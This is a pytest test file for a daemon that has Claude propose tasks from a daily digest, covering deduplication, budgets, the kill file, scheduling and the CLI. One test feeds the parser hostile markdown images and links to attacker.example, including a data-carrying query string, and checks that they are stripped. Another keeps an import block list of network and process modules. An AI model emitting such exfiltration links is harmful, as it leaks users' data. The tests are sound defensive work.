    assert result["proposals"] == 1 and result["dropped"]["duplicate"] == 1 and len(rig.stored()) == 1


def test_a_proposal_that_already_exists_as_proposed_is_not_created_again(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    save_proposal(rig.dir, proposal(1, title="Reply to the open thread!", status="proposed"))
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    titles = sorted(p.title for p in rig.stored())
    assert titles == ["Plan the follow up", "Reply to the open thread!"] and result["dropped"]["duplicate"] == 1
    # And a second full run on the same data adds nothing.
    again = run_propose_job(new_job(rig, suffix="-r2", force=True), rig.deps, mode="manual")
    assert again["proposals"] == 0 and again["dropped"]["duplicate"] == 2 and len(rig.stored()) == 2


def test_a_confirmed_proposal_also_blocks_a_repeat_but_a_rejected_one_does_not(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    save_proposal(rig.dir, proposal(1, title="Reply to the open thread", status="confirmed",
                                    tracker_ref="https://tracker.example/t/1"))
    save_proposal(rig.dir, proposal(2, title="Plan the follow up", status="rejected", rejected_reason="later"))
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["proposals"] == 1 and result["dropped"]["duplicate"] == 1
    assert sorted((p.title, p.status) for p in rig.stored()) == [
        ("Plan the follow up", "proposed"), ("Plan the follow up", "rejected"), ("Reply to the open thread", "confirmed")]


def test_more_than_the_configured_maximum_are_cut(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    def mutate(cfg: Config) -> None:
        cfg.propose.max_proposals = 3

    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=mutate, FAKE_CLAUDE_PROPOSALS="many")
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["proposals"] == 3 and result["dropped"]["over_limit"] == 9 and len(rig.stored()) == 3
    assert "at most 3 task proposals" in rig.runner.paid()[0]["stdin"]


def test_the_budget_refuses_the_call_and_nothing_is_written(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    def mutate(cfg: Config) -> None:
        cfg.claude.daily_budget_usd = 0.20  # less than the 0.30 propose cap

    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=mutate)
    result = run_propose_job(new_job(rig, attempts=3), rig.deps, mode="daemon")
    assert result["status"] == "failed" and result["claude_status"] == "budget"
    assert rig.runner.paid() == [] and rig.stored() == []
    refused = rig.events("budget_refused")
    assert len(refused) == 1 and refused[0]["cap_usd"] == 0.3 and refused[0]["purpose"] == "propose"
    assert rig.events("propose_intent") and rig.events("proposal_created") == []


def test_the_call_budget_refuses_too(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    def mutate(cfg: Config) -> None:
        cfg.claude.daily_calls = 0

    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=mutate)
    result = run_propose_job(new_job(rig, attempts=3), rig.deps, mode="daemon")
    assert result["status"] == "failed" and result["claude_status"] == "budget" and rig.runner.paid() == []


def test_a_transient_failure_asks_for_a_retry_until_the_last_attempt(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, scenario="500")
    with pytest.raises(Retry):
        run_propose_job(new_job(rig, attempts=1), rig.deps, mode="daemon")
    assert rig.stored() == []
    result = run_propose_job(new_job(rig, attempts=3, suffix="-r2"), rig.deps, mode="daemon")
    assert result["status"] == "failed" and rig.stored() == []


def test_a_kill_file_puts_the_job_back(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    (rig.state.dir / "KILL").write_text("x", encoding="utf-8")
    with pytest.raises(Retry) as caught:
        run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert caught.value.killed and rig.runner.records() == []


def test_a_run_without_a_complete_digest_makes_no_call(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=on)
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["status"] == "no_digest" and rig.runner.records() == [] and rig.stored() == []
    assert rig.brain.calls == 0, "no collector was started either"
    plant_digest(rig, "digest-2026-10-01", status="partial")
    again = run_propose_job(new_job(rig, suffix="-r2"), rig.deps, mode="daemon")
    assert again["status"] == "no_digest"


def test_a_switched_off_table_runs_nothing_unless_forced(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["status"] == "disabled" and rig.runner.records() == [] and rig.brain.calls == 0
    forced = run_propose_job(new_job(rig, force=True, suffix="-r2"), rig.deps, mode="manual")
    assert forced["status"] == "written" and forced["proposals"] == 2


def test_a_disabled_client_or_no_claude_makes_no_call(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, claude=False)
    assert run_propose_job(new_job(rig), rig.deps, mode="daemon")["status"] == "disabled"
    assert rig.runner.records() == []


def test_the_no_claude_parameter_makes_no_call(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    assert run_propose_job(new_job(rig, no_claude=True), rig.deps, mode="daemon")["status"] == "disabled"
    assert rig.runner.records() == []


def test_nothing_cleared_means_no_call(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, mutate=zebra, items=held_items())
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["status"] == "no_items" and rig.runner.records() == [] and rig.stored() == []


def test_rejected_examples_alone_are_not_something_to_propose_from(tmp_cfg: Config, tmp_path: Path,
                                                                    tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, items=[])
    saved_rejections(rig, 3)
    assert run_propose_job(new_job(rig), rig.deps, mode="daemon")["status"] == "no_items"
    assert rig.runner.records() == []


def test_only_the_local_collectors_run_and_never_the_paid_or_system_ones(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    extras = [Stub("clickup", [item("c-1", "Paid source")]), Stub("system"), Stub("git"), Stub("github"), Stub("task")]
    rig.deps.collectors = [rig.brain, *extras]
    run_propose_job(new_job(rig), rig.deps, mode="daemon")
    ran = {c.name: c.calls for c in [rig.brain, *extras]}
    assert ran == {"brain": 1, "clickup": 0, "system": 0, "git": 1, "github": 1, "task": 1}
    assert "Paid source" not in rig.runner.paid()[0]["stdin"]


def test_deterministic_items_never_reach_the_payload(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, items=[*CLEAN, item("s-1", "System line", meta={"render": "deterministic"})])
    plant_digest(rig)
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    assert "System line" not in result["payload"] and result["items"]["gated"] == 3


def test_a_failed_collector_does_not_stop_the_run(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    class Broken:
        name = "git"

        def collect(self, ctx: CollectContext) -> CollectResult:
            raise RuntimeError("boom")

    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    rig.deps.collectors = [rig.brain, Broken()]
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["status"] == "written" and any("git" in e for e in result["errors"])


def test_the_negative_examples_reach_a_real_run(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    saved_rejections(rig, 3)
    run_propose_job(new_job(rig), rig.deps, mode="daemon")
    stdin = rig.runner.paid()[0]["stdin"]
    assert "Rejected work 02" in stdin and "reason-02" in stdin
    assert [p.status for p in rig.stored()].count("proposed") == 2


def test_the_module_cannot_spawn_a_process_or_write_outside_the_helpers() -> None:
    tree_ = ast.parse((ROOT / "jarvisd" / "propose.py").read_text(encoding="utf-8"))
    imported = {a.name.split(".")[0] for n in ast.walk(tree_) if isinstance(n, ast.Import) for a in n.names}
    imported |= {n.module.split(".")[0] for n in ast.walk(tree_) if isinstance(n, ast.ImportFrom) and n.module}
    assert not imported & {"subprocess", "socket", "httpx", "urllib", "requests", "os"}, imported
    text = (ROOT / "jarvisd" / "propose.py").read_text(encoding="utf-8")
    assert "vault_write" not in text and "write_raw" not in text and "write_session" not in text
    assert not any(d in text for d in DASHES)


# --- scheduling ----------------------------------------------------------------------------------


def at(day: datetime, hhmm: str) -> datetime:
    hour, minute = map(int, hhmm.split(":"))
    return day.replace(hour=hour, minute=minute, second=0, microsecond=0)


def test_reconcile_does_nothing_while_disabled(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_done_digest(rig)
    assert reconcile_proposals(rig.clock.now, rig.cfg, rig.state, rig.store, rig.audit) is None
    assert rig.store.counts()["pending"] == 0


def test_reconcile_does_nothing_when_run_after_digest_is_off(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    def no_chain(cfg: Config) -> None:
        cfg.propose.enabled = True
        cfg.propose.run_after_digest = False

    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=no_chain)
    plant_done_digest(rig)
    assert reconcile_proposals(rig.clock.now, rig.cfg, rig.state, rig.store, rig.audit) is None
    assert rig.store.counts()["pending"] == 0


def test_reconcile_waits_for_a_complete_digest(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=on)
    now = rig.clock.now
    assert reconcile_proposals(now, rig.cfg, rig.state, rig.store, rig.audit) is None, "no digest at all"
    plant_done_digest(rig, result_status="degraded_no_llm", job_id=f"digest-{rig.day.isoformat()}")
    assert reconcile_proposals(now, rig.cfg, rig.state, rig.store, rig.audit) is None, "not a complete one"
    assert rig.store.counts()["pending"] == 0


def test_reconcile_enqueues_once_after_a_complete_digest(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=on)
    digest = plant_done_digest(rig)
    now = rig.clock.now
    job_id = reconcile_proposals(now, rig.cfg, rig.state, rig.store, rig.audit)
    assert job_id == f"propose-{rig.day.isoformat()}"
    assert reconcile_proposals(now, rig.cfg, rig.state, rig.store, rig.audit) is None
    job = rig.store.get(job_id)
    assert job is not None and job.kind == PROPOSE_KIND and job.latency_class == "background_batch"
    assert job.params.dry_run is False and job.params.no_claude is False and job.origin == "schedule"
    assert job.window is not None and digest.window is not None and job.window.start == digest.window.start
    enq = rig.events("job_enqueued")
    assert len(enq) == 1 and enq[0]["kind"] == PROPOSE_KIND


def test_reconcile_finds_a_forced_rerun_of_the_digest(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=on)
    plant_done_digest(rig, result_status="failed", job_id=f"digest-{rig.day.isoformat()}")
    assert reconcile_proposals(rig.clock.now, rig.cfg, rig.state, rig.store, rig.audit) is None
    plant_done_digest(rig, result_status="complete", job_id=f"digest-{rig.day.isoformat()}-r2")
    assert reconcile_proposals(rig.clock.now, rig.cfg, rig.state, rig.store, rig.audit) == f"propose-{rig.day.isoformat()}"


def test_reconcile_respects_kill_and_pause_and_needs_an_aware_time(tmp_cfg: Config, tmp_path: Path,
                                                                    tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=on)
    plant_done_digest(rig)
    now = rig.clock.now
    rig.state.set_pause(None, "test")
    assert reconcile_proposals(now, rig.cfg, rig.state, rig.store, rig.audit) is None
    rig.state.clear_pause()
    (rig.state.dir / "KILL").write_text("x", encoding="utf-8")
    assert reconcile_proposals(now, rig.cfg, rig.state, rig.store, rig.audit) is None
    with pytest.raises(ValueError):
        reconcile_proposals(datetime(2026, 10, 6, 5, 0), rig.cfg, rig.state, rig.store, rig.audit)


def test_a_tick_runs_the_digest_and_then_the_proposals(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=on)
    now = at(rig.clock.now.astimezone(timezone.utc), "07:00")
    rig.clock.set(now)
    recent = tmp_vault / "RECENT.md"  # fresh, so the digest does not wait for the nightly rebuild
    os.utime(recent, ((now - timedelta(minutes=30)).timestamp(),) * 2)
    result = daemon_mod.tick(rig.deps, now, task_mode=False, command_runner=lambda argv, timeout: READY)
    assert result.action == "ran"
    day = now.date().isoformat()
    assert rig.store.exists(f"digest-{day}") == "done"
    assert rig.store.exists(f"propose-{day}") == "done", "queued right after the digest, run in the same tick"
    assert len(rig.stored()) == 2 and all(p.run_id == f"digest-{day}" for p in rig.stored())
    assert len(rig.runner.paid()) == 2, "one call for the digest, one for the proposals"


def test_a_tick_leaves_proposals_alone_while_the_table_is_off(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    plant_done_digest(rig)
    now = rig.clock.now
    daemon_mod.tick(rig.deps, now, task_mode=False, command_runner=lambda argv, timeout: READY)
    assert rig.store.exists(f"propose-{rig.day.isoformat()}") is None and rig.runner.paid() == []


# --- the commands ---------------------------------------------------------------------------------


def run_cli(rig: Rig, tmp_path: Path, *argv: str) -> int:
    return cli.main(list(argv), cfg=rig.cfg, claude_runner=rig.runner, network_probe=lambda: True,
                    command_runner=lambda a, t: READY, task_base_dir=tmp_path / "no-task-files",
                    clock=lambda: datetime.now(timezone.utc))


def test_cli_dry_run_prints_the_payload_and_spawns_nothing(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                                           capsys: pytest.CaptureFixture[str]) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    def jobs() -> set[str]:
        return {n for n in tree(rig.root / "queue") if not n.endswith(".lock")}  # a read takes the queue lock

    queue_before = jobs()
    code = run_cli(rig, tmp_path, "propose", "--dry-run")
    out = capsys.readouterr().out
    assert code == 0 and "Dry run" in out and "Nothing was written" in out and "<data>" in out
    assert "Synthetic thread one" in out, "the real brain collector read the synthetic RECENT.md"
    assert rig.runner.records() == [] and not rig.dir.exists() and jobs() == queue_before


def test_cli_dry_run_has_no_held_content(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                         capsys: pytest.CaptureFixture[str]) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault, mutate=zebra)
    plant_digest(rig)
    (tmp_vault / "RECENT.md").write_text(
        "# Recent\n\n## Open Threads\n- [2026-10-04] Synthetic thread one, waiting on a reviewer\n"
        f"- [2026-10-04] Rotate the zebra-token {CANARY}\n", encoding="utf-8", newline="\n")
    assert run_cli(rig, tmp_path, "propose", "--dry-run") == 0
    out = capsys.readouterr().out
    assert "zebra" not in out and CANARY not in out and "Synthetic thread one" in out


def test_cli_dry_run_without_a_digest_says_so(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                               capsys: pytest.CaptureFixture[str]) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    assert run_cli(rig, tmp_path, "propose", "--dry-run") == 0
    assert "no complete digest" in capsys.readouterr().out.lower() and rig.runner.records() == []


def test_cli_refuses_while_switched_off_and_spends_nothing(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                                           capsys: pytest.CaptureFixture[str]) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    code = run_cli(rig, tmp_path, "propose")
    out = capsys.readouterr().out
    assert code == 0 and "switched off" in out and "--force" in out and "--dry-run" in out
    assert rig.runner.records() == [] and not rig.dir.exists() and rig.store.counts()["pending"] == 0


def test_cli_force_runs_once_even_when_switched_off(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                                    capsys: pytest.CaptureFixture[str]) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    code = run_cli(rig, tmp_path, "propose", "--force")
    out = capsys.readouterr().out
    assert code == 0 and "proposal(s)" in out and len(rig.runner.paid()) == 1
    assert len(rig.stored()) == 2
    again = run_cli(rig, tmp_path, "propose", "--force")
    assert again == 0 and len(rig.runner.paid()) == 2, "--force also allows a second run on the same date"
    capsys.readouterr()
    assert rig.store.exists(f"propose-{rig.day.isoformat()}-r2") == "done"


def test_cli_a_second_run_without_force_is_refused(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                                   capsys: pytest.CaptureFixture[str]) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    assert run_cli(rig, tmp_path, "propose") == 0
    capsys.readouterr()
    assert run_cli(rig, tmp_path, "propose") == 1
    assert "already exists" in capsys.readouterr().out and len(rig.runner.paid()) == 1


def test_cli_refuses_under_a_kill_file(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                       capsys: pytest.CaptureFixture[str]) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    (rig.state.dir / "KILL").write_text("x", encoding="utf-8")
    assert run_cli(rig, tmp_path, "propose") == 3 and rig.runner.records() == []
    capsys.readouterr()


def test_cli_lists_open_proposals_and_all_of_them(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                                  capsys: pytest.CaptureFixture[str]) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    assert run_cli(rig, tmp_path, "proposals") == 0
    assert "No proposals" in capsys.readouterr().out
    save_proposal(rig.dir, proposal(1, title="Open one"))
    save_proposal(rig.dir, proposal(2, title="Rejected one", status="rejected", rejected_reason="not now"))
    save_proposal(rig.dir, proposal(3, title="Confirmed one", status="confirmed", tracker_ref="https://tracker.example/t/9"))
    assert run_cli(rig, tmp_path, "proposals") == 0
    out = capsys.readouterr().out
    assert "Open one" in out and "Rejected one" not in out and "Confirmed one" not in out
    assert "p-00000001" in out and "synthetic-project" in out and "task" in out
    assert run_cli(rig, tmp_path, "proposals", "--all") == 0
    out = capsys.readouterr().out
    assert "Open one" in out and "Rejected one" in out and "not now" in out and "Confirmed one" in out
    assert "https://tracker.example/t/9" in out
    assert not any(d in out for d in DASHES)


def test_cli_listing_changes_nothing(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path,
                                     capsys: pytest.CaptureFixture[str]) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    save_proposal(rig.dir, proposal(1))
    before = {p: p.read_bytes() for p in rig.dir.iterdir()}
    run_cli(rig, tmp_path, "proposals", "--all")
    assert {p: p.read_bytes() for p in rig.dir.iterdir()} == before and rig.runner.records() == []
    capsys.readouterr()


def test_the_new_commands_are_registered() -> None:
    parser = cli.build_parser()
    assert parser.parse_args(["propose", "--dry-run", "--force"]).dry_run is True
    assert parser.parse_args(["proposals", "--all"]).all is True
    assert {"propose", "proposals"} <= set(cli.HANDLERS)


# --- release 1.2.0: markup, near duplicates, a retry that must not undo a decision, the window ----------------------------


def test_parse_neutralizes_markdown_links_images_and_long_html(tmp_cfg: Config) -> None:
    hostile = ("See ![x](https://attacker.example/p?d=abc) and [read](https://attacker.example/q) now "
               '<img src="https://attacker.example/' + "z" * 120 + '">')
    out = parse_proposals(reply(draft("Fix ![t](https://attacker.example/t) it", rationale=hostile)), IDS, tmp_cfg, 8)
    only = out.proposals[0]
    assert "attacker.example" not in only.title + only.rationale
    assert "![" not in only.rationale and "](" not in only.rationale and "<img" not in only.rationale
    assert only.title.startswith("Fix") and "read" in only.rationale and "now" in only.rationale


def test_live_proposals_are_shown_to_the_model_so_it_does_not_reword_them(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    save_proposal(rig.dir, proposal(1, title="Exercise the kill switch", status="proposed"))
    save_proposal(rig.dir, proposal(2, title="Already shipped work", status="confirmed",
                                    tracker_ref="https://tracker.example/t/1"))
    save_proposal(rig.dir, proposal(3, title="Edited work", status="edited_confirmed",
                                    tracker_ref="https://tracker.example/t/2", edits={"title": "Edited by the owner"}))
    save_proposal(rig.dir, proposal(4, title="Rejected work", status="rejected", rejected_reason="no"))
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    payload = result["payload"]
    assert "open-p-00000001" in payload and "Exercise the kill switch" in payload
    assert "Already shipped work" in payload and "Edited by the owner" in payload
    assert result["items"]["open_examples"] == 3 and result["items"]["negative_examples"] == 1
    assert "already open" in result["header"]
    assert "never cite" in propose.SYSTEM_PROMPT and "open-" in propose.SYSTEM_PROMPT


def test_at_most_thirty_live_proposals_are_shown_newest_first(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = build(tmp_cfg, tmp_path, tmp_vault)
    plant_digest(rig)
    for n in range(1, 36):
        save_proposal(rig.dir, proposal(n, title=f"Standing work {n:02d}", status="proposed"))
    result = run_propose_job(new_job(rig, dry_run=True), rig.deps, mode="manual")
    assert result["items"]["open_examples"] == 30
    assert "Standing work 35" in result["payload"] and "Standing work 06" in result["payload"]
    assert "Standing work 05" not in result["payload"]


def test_a_live_proposal_is_not_evidence(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, FAKE_CLAUDE_PROPOSALS="echo_open")
    save_proposal(rig.dir, proposal(1, title="Exercise the kill switch", status="proposed"))
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["proposals"] == 0 and result["dropped"]["ungrounded"] == 1


def test_open_examples_alone_are_not_something_to_propose_from(tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault, items=[])
    save_proposal(rig.dir, proposal(1, title="Exercise the kill switch", status="proposed"))
    result = run_propose_job(new_job(rig), rig.deps, mode="daemon")
    assert result["status"] == "no_items" and rig.runner.paid() == []


def test_a_retried_job_never_overwrites_a_proposal_the_owner_already_decided(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    job = new_job(rig)
    first = run_propose_job(job, rig.deps, mode="daemon")
    target = next(p for p in rig.stored() if p.title == "Reply to the open thread")
    assert target.id in first["ids"]
    save_proposal(rig.dir, target.model_copy(update={"status": "rejected", "rejected_reason": "not for me"}))
    manifest = propose.latest_digest_manifest(rig.state.dir)
    assert manifest is not None
    again = propose.ParsedProposals([propose.Draft("Reply to the open thread", "synthetic-project", "task",
                                                   ["t-open-1"], "to do", None, "Synthetic reason.")])
    run = propose._Run(job=job, deps=rig.deps, mode="daemon", now=rig.clock.now)
    result = propose._write(run, manifest, again, "sha", gated=3, held=0, to_claude=3, negatives=0)
    kept = next(p for p in rig.stored() if p.id == target.id)
    assert kept.status == "rejected" and kept.rejected_reason == "not for me"
    assert len(rig.events("proposal_created")) == 2, "no second proposal_created for the same id"
    assert target.id in result["ids"], "the job still reports the proposal it made"


def test_a_retry_after_a_busy_save_keeps_the_first_attempts_proposal_and_adds_the_rest(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    job = new_job(rig)
    run_propose_job(job, rig.deps, mode="daemon")
    before = {p.id: p.model_dump_json() for p in rig.stored()}
    manifest = propose.latest_digest_manifest(rig.state.dir)
    assert manifest is not None
    drafts = propose.ParsedProposals([
        propose.Draft("Reply to the open thread", "synthetic-project", "task", ["t-open-1"], "to do", None, "Synthetic reason."),
        propose.Draft("A brand new idea", "synthetic-project", "task", ["t-open-2"], "to do", None, "Fresh.")])
    propose._write(propose._Run(job=job, deps=rig.deps, mode="daemon", now=rig.clock.now), manifest, drafts, "sha",
                   gated=3, held=0, to_claude=3, negatives=0)
    after = {p.id: p.model_dump_json() for p in rig.stored()}
    assert len(after) == 3 and all(after[k] == v for k, v in before.items())


def test_the_window_is_never_narrower_than_the_default_even_after_a_forced_digest_rerun(
        tmp_cfg: Config, tmp_path: Path, tmp_vault: Path) -> None:
    rig = ready(tmp_cfg, tmp_path, tmp_vault)
    end = rig.clock.now - timedelta(minutes=20)
    job = new_job(rig, dry_run=True)
    job.window = JobWindow(start=iso(end - timedelta(minutes=13)), end=iso(end))  # a rerun starts at the watermark
    result = run_propose_job(job, rig.deps, mode="manual")
    default = timedelta(hours=rig.cfg.digest.window_hours_default)
    assert f"Window: {iso(end - default)} to {iso(end)}." in result["header"]
    wide = new_job(rig, dry_run=True, suffix="-wide")
    wide.window = JobWindow(start=iso(end - timedelta(hours=60)), end=iso(end))
    again = run_propose_job(wide, rig.deps, mode="manual")
    assert f"Window: {iso(end - timedelta(hours=60))} to {iso(end)}." in again["header"], "a wider window is kept"
